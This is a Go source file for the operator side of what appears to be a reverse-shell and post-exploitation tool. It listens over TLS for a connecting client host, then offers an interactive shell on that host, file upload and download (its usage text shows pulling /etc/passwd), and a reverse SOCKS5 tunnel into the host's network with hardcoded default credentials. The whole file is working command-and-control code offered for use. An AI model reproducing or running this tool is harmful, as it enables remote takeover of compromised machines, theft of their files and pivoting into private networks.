package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path"
	"strings"

	"github.com/creack/pty"
	"github.com/djimenez/iconv-go"
	"github.com/hashicorp/yamux"
	"golang.org/x/crypto/ssh/terminal"
)

var(
	help bool
	action string
	port string
	lencode string
	rencode string
	lpath string
	ldir string
	rpath string
	rdir string
	sport string
	suser string
	spass string
	session *yamux.Session
)

func init(){
	flag.BoolVar(&help, "h", false, "this help")
	flag.BoolVar(&help, "help", false, "this help")

	flag.StringVar(&action, "a", "shell", `set action,
'shell' for get an interactive shell,
'upload' for upload file to remote directory,
'download' for download file from remote path,
'socks' for build reverse socks proxy`)

	flag.StringVar(&port, "p", "8081", "set listen port")

	flag.StringVar(&lencode, "lencode", "utf-8", "local encode type, together with action 'shell'")

	flag.StringVar(&rencode, "rencode", "utf-8", "remote encode type, together with action 'shell'")

	flag.StringVar(&lpath, "lpath", "", "local file path, together with action 'upload'")

	flag.StringVar(&rdir, "rdir", ".", "remote directory, together with action 'upload'")

	flag.StringVar(&rpath, "rpath", "", "remote file path, together with action 'download'")

	flag.StringVar(&ldir, "ldir", ".", "local directory, together with action 'download'")

	flag.StringVar(&sport, "sport", "7777", "socks5 listen port, together with action 'socks'")

	flag.StringVar(&suser, "suser", "blue", "user name for socks5 auth, together with action 'socks'")

	flag.StringVar(&spass, "spass", "Blue@2020", "password for socks5 auth, together with action 'socks'")

	flag.Usage = usage
}

func usage(){
	fmt.Fprintf(os.Stderr, `Author:MiWen, Version:0.1
Usage: 
get an interactive shell from client host
# server -a shell -p 8081  -lencode utf-8 -rencode gb2312

download file from client host
# server -a download -p 8081 -rpath /etc/passwd -ldir /tmp/

upload local file to client host
# server -a upload -p 8081 -lpath /etc/passwd -rdir /tmp/

Options:
`)
	flag.PrintDefaults()
}

func GetShell(conn net.Conn,clientOsName string) int{

	end := make(chan int)
	var err error

	if clientOsName != "windows" {

		stdoutFD := int(os.Stdout.Fd())

		oldState, err := terminal.MakeRaw(stdoutFD)
		if err != nil {
			fmt.Println(err)
			return 7
		}

		defer func() { _ = terminal.Restore(stdoutFD, oldState) }()

		termEnv := os.Getenv("TREM")

		if termEnv==""{
			termEnv = "vt100"
		}

		_, err = conn.Write([]byte(termEnv))
		if err!=nil{
			fmt.Println(err)
			return 8
		}

		ws, _ := pty.GetsizeFull(os.Stdin)

		_, err = conn.Write([]byte{byte(ws.Rows),byte(ws.Rows >> 8),byte(ws.Cols),byte(ws.Cols >> 8)})
		if err!=nil{
			fmt.Println(err)
			return 9
		}


	}

	go func(end chan int) {

		if rencode != lencode {
			remoteReader, err := iconv.NewReader(conn, rencode, lencode)

			if err != nil {
				end <- 10
				fmt.Println(err)
				return
			}

			_, err = io.Copy(os.Stdin, remoteReader)
		}else{
			_, err = io.Copy(os.Stdin, conn)
		}

		if err!=nil{
			fmt.Println(err)
		}

		end <- 11

	}(end)

	go func(end chan int) {
		if rencode != lencode {
			localReader, err := iconv.NewReader(os.Stdout, lencode, rencode)

			if err != nil {
				end <- 12
				fmt.Println(err)
				return
			}

			_, err = io.Copy(conn, localReader)
		}else{
			_, err = io.Copy(conn, os.Stdout)
		}

		if err!=nil{
			fmt.Println(err)
		}

		end <- 13
	}(end)

	select{
	case errCode := <- end:
		return errCode
	}
}

func UploadFile(conn net.Conn,clientOsName string) int{
	if lpath=="" || rdir ==""{
		return 14
	}
	fileName := path.Base(lpath)

	if clientOsName == "windows" && !strings.HasSuffix(rdir,"\\"){
		rdir +="\\"
	}

	if clientOsName != "windows" && !strings.HasSuffix(rdir,"/"){
		rdir +="/"
	}

	filePath := rdir+fileName

	_, err := conn.Write([]byte(filePath))
	if err!=nil{
		fmt.Println(err)
		return 15
	}
	f,err := os.Open(lpath)

	if err!=nil{
		fmt.Println(err)
		return 16
	}

	defer f.Close()

	_, err = io.Copy(conn, f)
	if err!=nil{
		fmt.Println(err)
		return 17
	}
	fmt.Println("upload file done")
	return 0
}

func DownloadFile(conn net.Conn,clientOsName string) int{
	if ldir=="" || rpath ==""{
		return 18
	}

	_, err := conn.Write([]byte(rpath))

	if err!=nil{
		fmt.Println(err)
		return 19
	}

	fileName := ""

	if clientOsName == "windows"{
		fs := strings.Split(rpath,"\\")
		fileName = fs[len(fs)-1]
	}else{
		fs := strings.Split(rpath,"/")
		fileName = fs[len(fs)-1]
	}

	if !strings.HasSuffix(ldir,"/"){
		ldir +="/"
	}

	filePath := ldir+fileName

	f,err :=os.Create(filePath)

	if err!=nil{
		fmt.Println(err)
		return 20
	}

	defer f.Close()

	_, err = io.Copy(f, conn)

	if err!=nil{
		fmt.Println(err)
		return 21
	}
	fmt.Println("download file done")
	return 0
}

func SocksProxy(conn net.Conn) int{
	_, err := conn.Write([]byte(suser))
	if err!=nil{
		return 22
	}

	_, err = conn.Write([]byte(spass))
	if err!=nil{
		return 23
	}

	session, err := yamux.Client(conn, nil)
	if err != nil {
		return 24
	}


	ln, err := net.Listen("tcp", ":"+sport)
	if err != nil {
		return 25
	}

	log.Println("socks tunnel is ready, listening on "+sport)

	for {
		socksConn, err := ln.Accept()
		if err != nil {
			return 26
		}

		if session == nil {
			_ = socksConn.Close()
			continue
		}

		stream, err := session.Open()

		if err != nil {
			return 27
		}

		go func() {
			_, _ = io.Copy(socksConn, stream)
			_ = socksConn.Close()
		}()
		go func() {
			_, _ = io.Copy(stream, socksConn)
			_ = stream.Close()
		}()
	}
}

func HandleConnection(conn net.Conn,c chan int) {
	defer conn.Close()

	code := 0
	fmt.Print("new connection from "+conn.RemoteAddr().String())

	clientInfo := make([]byte, 128)

	read_len, err := conn.Read(clientInfo)

	if err != nil || read_len == 0{
		fmt.Println(err)
		c <- 5
		return
	}
	_, err = conn.Write([]byte(action))
	if err!=nil{
		c <- 6
		return
	}


	clientOsName := strings.TrimSpace(string(clientInfo[:read_len]))

	fmt.Println(" , os type is "+clientOsName)

	if action =="shell"{
		code = GetShell(conn,clientOsName)
	}else if action =="upload"{
		code = UploadFile(conn,clientOsName)
	}else if action =="download"{
		code = DownloadFile(conn,clientOsName)
	}else if action =="socks"{
		code = SocksProxy(conn)
	}

	c <- code
}

func main() {

	flag.Parse()
	if help{
		flag.Usage()
		os.Exit(0)
	}

	if action != "shell" && action != "upload" && action != "download" && action != "socks"{
		println("action error ,-h for help")
		os.Exit(1)
	}

	c :=make(chan int)

	cer, err := tls.LoadX509KeyPair("key/server.pem", "key/server.key")
	if err != nil {
		os.Exit(2)
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cer},
		InsecureSkipVerify: true,
	}

	tlsServer, err := tls.Listen("tcp", ":"+port , config)

	if err != nil {
		os.Exit(3)
	}

	fmt.Println("waiting for client connect...")

	conn, err := tlsServer.Accept()

	if err != nil {
		os.Exit(4)
	}

	_ = tlsServer.Close()

	go HandleConnection(conn,c)

	exitCode := <-c

	os.Exit(exitCode)
}
